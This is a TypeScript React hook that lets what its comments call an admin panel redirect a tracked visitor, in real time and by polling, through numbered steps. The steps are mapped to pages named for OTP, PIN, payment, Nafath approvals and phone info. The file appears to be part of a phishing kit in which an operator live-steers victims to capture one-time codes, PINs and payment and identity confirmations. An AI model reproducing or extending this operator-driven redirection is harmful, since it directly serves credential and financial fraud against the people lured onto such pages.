;
import { useEffect, useRef } from 'react';
import { useLocation } from 'wouter';
import { clearRedirectPage } from '@/lib/visitor-tracking';
import { onVisitorRedirect } from '@/lib/socket';
import { API_BASE } from '@/lib/api';

interface UseRedirectMonitorProps {
  visitorId: string;
  currentPage: string;
}

const pageMap: Record<string, string> = {
  // Admin panel page IDs
  'home-new': '/home-new',
  home: '/home-new',
  step1: '/step1',
  insur: '/step1',
  insur2: '/step1',
  step2: '/step2',
  otp: '/step2',
  veri: '/step2',
  '_t2': '/step2',
  step3: '/step3',
  pin: '/step3',
  confi: '/step3',
  '_t3': '/step3',
  step4: '/step4',
  check: '/step4',
  payment: '/step4',
  nafad: '/step4',
  '_t6': '/step4',
  step5: '/step5',
  phone: '/step5',
  'phone-info': '/step5',
  '_t5': '/step5',
  step6: '/step6',
  nafad2: '/step6',
  compar: '/compar',
  'thank-you': '/thank-you',
};

export function useRedirectMonitor({ visitorId, currentPage }: UseRedirectMonitorProps) {
  const [, navigate] = useLocation();
  const redirectedRef = useRef(false);
  const initializedRef = useRef(false);

  useEffect(() => {
    if (!visitorId) return;
    
    // Only reset redirectedRef on first mount, not on every currentPage change
    // This prevents the redirect from being triggered again after successful redirect
    if (!initializedRef.current) {
      redirectedRef.current = false;
      initializedRef.current = true;
    }
    
    console.log('[useRedirectMonitor] Monitoring for visitor:', visitorId, 'currentPage:', currentPage);

    const doRedirect = async (targetPage: string) => {
      if (redirectedRef.current) return;
      const targetUrl = pageMap[targetPage];
      if (!targetUrl) {
        console.log('[useRedirectMonitor] No targetUrl for page:', targetPage);
        return;
      }
      // Don't redirect to same page
      const currentUrl = window.location.pathname;
      if (currentUrl === targetUrl) {
        console.log('[useRedirectMonitor] Already on target page:', targetUrl);
        // Clear oneTimeRedirect if already on target page
        try { 
          await clearRedirectPage(visitorId); 
        } catch { /* ignore */ }
        return;
      }
      
      // CRITICAL: Clear oneTimeRedirect BEFORE redirect to prevent race conditions
      // This ensures the redirect flag is cleared even before the page changes
      try { 
        await clearRedirectPage(visitorId); 
        console.log('[useRedirectMonitor] oneTimeRedirect cleared BEFORE redirect');
      } catch { /* ignore */ }
      
      redirectedRef.current = true;
      console.log('[useRedirectMonitor] Redirecting to', targetPage, '->', targetUrl);
      
      // Navigate to target page
      navigate(targetUrl);
    };

    // 1. Socket.io real-time redirect (instant)
    const unsubscribeRedirect = onVisitorRedirect(({ targetPage }) => {
      doRedirect(targetPage);
    });

    // 2. Polling fallback every 1s - catches redirects when socket was offline
    const pollInterval = setInterval(async () => {
      if (redirectedRef.current) return;
      try {
        const url = `${API_BASE}/api/visitors/${visitorId}`;
        const res = await fetch(url, {
          headers: { 'Accept': 'application/json' }
        });
        if (!res.ok) {
          return;
        }
        const data = await res.json();
        // Check for oneTimeRedirect flag (this is the one-time redirect signal)
        const oneTimeRedirect = data.oneTimeRedirect;
        if (oneTimeRedirect && oneTimeRedirect !== currentPage) {
          console.log('[useRedirectMonitor] oneTimeRedirect detected:', oneTimeRedirect);
          doRedirect(oneTimeRedirect);
        }
      } catch (err) {
        // Ignore polling errors silently
      }
    }, 1000);

    return () => {
      unsubscribeRedirect();
      clearInterval(pollInterval);
    };
  }, [visitorId, currentPage, navigate]);
}
